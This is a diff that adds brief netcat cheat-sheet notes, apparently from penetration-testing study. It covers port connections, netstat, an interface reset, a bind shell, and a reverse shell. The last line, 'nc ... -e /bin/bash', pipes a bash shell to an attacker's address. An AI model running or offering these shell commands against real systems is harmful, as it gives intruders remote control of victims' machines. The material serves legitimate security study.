@@ -1,0 +1,25 @@
+Using nc to connect to a TCP port
+> nc -nv 10.11.0.22 110
+
+show Active Connection
+>netstat -antup
+
+#reset eth0
+ip addr flush dev eth0
+#if network card mode nat eth0 take ip from dhcp
+dhcpclient eth0
+
+#Bind $hell
+Listening on a TCP/UDP Port
+Using nc to set up a listener
+victim
+>nc -nlvp 4444
+Using nc to connect to a listener
+attacker
+>nc -nv 10.11.0.22 4444
+
+#Rever$E $hell
+attacker
+nc -l -p 4444
+victim
+nc 10.1.4.207 4444 -e /bin/bash
